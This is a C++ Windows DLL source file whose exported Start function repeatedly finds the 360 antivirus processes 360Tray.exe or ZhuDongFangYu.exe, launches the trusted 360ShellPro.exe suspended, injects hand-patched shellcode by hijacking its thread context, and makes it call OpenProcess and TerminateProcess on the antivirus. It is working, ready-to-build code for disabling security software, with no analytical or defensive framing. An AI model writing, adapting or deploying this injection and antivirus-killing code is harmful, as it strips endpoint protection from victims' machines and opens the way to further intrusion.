// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
#include <tlhelp32.h>
#include <string>
#pragma warning (disable:4302)
#pragma warning (disable:4311)

BYTE shellcode[] =
{
    0x55,0x8b,0xec,0x83,0xec,0x40,0x64,0xa1,0x30,0x00,0x00,0x00,0x8b,0x40,0x0c,0x8b,
    0x40,0x1c,0x89,0x45,0xfc,0x8b,0x50,0x04,0x89,0x55,0xf8,0x0f,0xb7,0x48,0x1c,0x8b,
    0x58,0x20,0x33,0xd2,0x33,0xf6,0x66,0x03,0x14,0x33,0xc1,0xc2,0x08,0x83,0xc6,0x02,
    0x3b,0xce,0x75,0xf2,0x81,0xfa,0xbe,0xcc,0xd1,0xd5,0x74,0x11,0x81,0xfa,0xff,0x0c,
    0x12,0x36,0x74,0x09,0x8b,0x00,0x3b,0x45,0xf8,0x75,0xd0,0xc9,0xc3,0x8b,0x40,0x08,
    0x89,0x45,0xf4,0x05,0xaa,0xaa,0xaa,0xaa,0x68,0x11,0x11,0x11,0x11,0x6a,0x00,0x68,
    0xff,0x0f,0x1f,0x00,0xff,0xd0,0x83,0xf8,0x00,0x74,0x0e,0x50,0x6a,0x00,0x50,0xb8,
    0xbb,0xbb,0xbb,0xbb,0x03,0x45,0xf4,0xff,0xd0,0x6a,0x00,0xb8,0xbb,0xbb,0xbb,0xbb,
    0x03,0x45,0xf4,0xff,0xd0
};

DWORD getProcessIdByName(const std::wstring& processName) {
    
    DWORD processId     = 0;
    HANDLE hSnapshot    = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) 
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) 
        {
            do {
                if (std::wstring(pe32.szExeFile) == processName) 
                {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

BOOL createProcess(__in WCHAR* path, __out PROCESS_INFORMATION* ppi)
{
    STARTUPINFO si;
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    if (!CreateProcessW(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, ppi)) return FALSE;

    return TRUE;
}

BOOL injectProcess(PROCESS_INFORMATION* ppi, BYTE* shellcode, SIZE_T size)
{
    LPVOID remoteBuffer = VirtualAllocEx(ppi->hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (remoteBuffer == NULL) return FALSE;

    if (!WriteProcessMemory(ppi->hProcess, remoteBuffer, shellcode, size, NULL)) return FALSE;

    DWORD threadId = GetThreadId(ppi->hThread);
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, threadId);

    if (hThread == NULL) return FALSE;

#ifdef  _WIN64
    WOW64_CONTEXT ctx;
#else
    CONTEXT ctx;
#endif //  _WIN64

    SecureZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;

#ifdef  _WIN64
    if (!Wow64GetThreadContext(hThread, &ctx))
#else
    if (!GetThreadContext(hThread, &ctx))
#endif //  _WIN64
        return FALSE;

    ctx.Eip = (DWORD32)remoteBuffer;

#ifdef  _WIN64
    if (!Wow64SetThreadContext(hThread, &ctx))
#else
    if (!SetThreadContext(hThread, &ctx))
#endif //  _WIN64
        return FALSE;

    ResumeThread(ppi->hThread);
    WaitForSingleObject(ppi->hProcess, INFINITE);
    CloseHandle(ppi->hProcess);
    CloseHandle(ppi->hThread);
    return TRUE;
}

#ifdef _WIN64

DWORD getFunctionRVA(const char* dllPath, const char* functionName) {

    HMODULE hModule = LoadLibraryExA(dllPath, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE);

    if (hModule == NULL) return 0;

    hModule = (HMODULE)((BYTE*)hModule - 0x2);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        FreeLibrary(hModule);
        return 0;
    }

    PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)((BYTE*)hModule + pDosHeader->e_lfanew);

    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        FreeLibrary(hModule);
        return 0;
    }

    DWORD exportDirRVA = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportDirSize = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);

    DWORD* pNameArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pAddrArray = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i)
    {
        CONST CHAR* name = (CONST CHAR*)((BYTE*)hModule + pNameArray[i]);

        if (strcmp(name, functionName) == 0)
        {
            DWORD funcRVA = pAddrArray[i + 1];
            FreeLibrary(hModule);
            return funcRVA;
        }
    }

    FreeLibrary(hModule);
    return 0;
}

#endif // !_WIN64

extern "C" __declspec(dllexport)  VOID WINAPI Start()
{
    PROCESS_INFORMATION pi;
    WCHAR tarPath[MAX_PATH] = L"C:\\Program Files (x86)\\360\\360Safe\\360ShellPro.exe";
    
    do {

        DWORD trayId = getProcessIdByName(L"360Tray.exe");
        DWORD zdFanfyuId = getProcessIdByName(L"ZhuDongFangYu.exe");
        DWORD killId = 0;

        trayId != 0 ? (killId = trayId) : (killId = zdFanfyuId);

        if (!killId)
        {
            Sleep(10 * 1000);
            continue;
        }

        SecureZeroMemory(&pi, sizeof(pi));

        if (createProcess(tarPath, &pi))
        {
#ifdef  _WIN64
            *(DWORD*)&shellcode[0x54] = getFunctionRVA("C:\\Windows\\SysWOW64\\kernel32.dll", "OpenProcess");
            *(DWORD*)&shellcode[0x59] = killId;
            *(DWORD*)&shellcode[0x60] = PROCESS_TERMINATE;
            *(DWORD*)&shellcode[0x70] = getFunctionRVA("C:\\Windows\\SysWOW64\\kernel32.dll", "TerminateProcess");
            *(DWORD*)&shellcode[0x7c] = getFunctionRVA("C:\\Windows\\SysWOW64\\kernel32.dll", "ExitThread");
#else
            *(DWORD*)&shellcode[0x54] = (DWORD32)OpenProcess - (DWORD32)GetModuleHandleA("kernel32.dll");
            *(DWORD*)&shellcode[0x59] = killId;
            *(DWORD*)&shellcode[0x60] = PROCESS_TERMINATE;
            *(DWORD*)&shellcode[0x70] = (DWORD)TerminateProcess - (DWORD32)GetModuleHandleA("kernel32.dll");
            *(DWORD*)&shellcode[0x7c] = (DWORD)ExitThread - (DWORD32)GetModuleHandleA("kernel32.dll");
#endif //  _WIN64

            injectProcess(&pi, shellcode, sizeof(shellcode));
        }

    } while (TRUE);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

